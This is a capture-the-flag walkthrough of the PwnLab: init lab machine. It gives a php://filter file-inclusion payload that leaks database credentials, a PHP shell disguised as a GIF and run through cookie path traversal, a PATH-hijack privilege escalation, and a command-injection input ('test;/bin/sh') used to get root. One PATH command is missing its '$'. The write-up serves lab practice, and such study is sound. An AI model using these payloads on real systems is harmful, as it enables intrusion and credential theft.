--------------------------------
# Author Shubham Ranpise
--------------------------------

# 18/december/2022

# PawnLab

----------------------------------------------------------------
# nmap scan ()
----------------------------------------------------------------
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
111/tcp  open  rpcbind 2-4 (RPC #100000)
3306/tcp open  mysql   MySQL 5.5.47-0+deb8u1

https://book.hacktricks.xyz/pentesting-web/file-inclusion
php://filter/convert.base64-encode/resource=login
http://10.0.2.14/?page=php://filter/convert.base64-encode/resource=config

<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>

 mysql -u root -p -h 10.0.2.14 
 show databases;
use Users;
show tables;
select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |JWzXuBJJNy
| mike | U0lmZHNURW42SQ== |SIfdsTEn6I
| kane | aVN2NVltMkdSbw== |iSv5Ym2GRo
+------+------------------+

gif file header GIF89a
shell.php >shell.gif

modify cookie with burp  
decode index page to know reason of this step
http://10.0.2.14/?page=php://filter/convert.base64-encode/resource=index
../upload/f3035846cc279a1aff73b7c2c25367b9.gif
Cookie: lang=../upload/f3035846cc279a1aff73b7c2c25367b9.gif

upload execute got shell

----------------------------------------------------------------
# privilege escalation
----------------------------------------------------------------
su kane
-> ./msgmike
cat: /home/mike/msg.txt: No such file or directory

-> make own cat and run 
-> echo "/bin/bash" > cat
-> chmod +x cat
-> export PATH=/home/kane:PATH
-> /home/kane/msgmike
bash: dircolors: command not found
bash: ls: command not found

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  

you got mike shell


-> cd /home/mike
-> ls
msg2root

./msg2root
test;/bin/sh

you got root
----------------------------------------------------------------
# flag
----------------------------------------------------------------
-> cat flag.txt
.-=~=-.                                                                 .-=~=-.
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
(_ ___)  _____                             _                            (_ ___)
(__  _) /  __ \                           | |                           (__  _)
( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
( _ __)                     __/ |                                       ( _ __)
(__  _)                    |___/                                        (__  _)
(__  _)                                                                 (__  _)
(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
(__  _) this challenge.                                                 (__  _)
(_ ___)                                                                 (_ ___)
( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
(__  _) reading it                                                      (__  _)
(__  _)                                                                 (__  _)
(__  _)                                             For sniferl4bs.com  (__  _)
( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'                                                                 `-._.-'
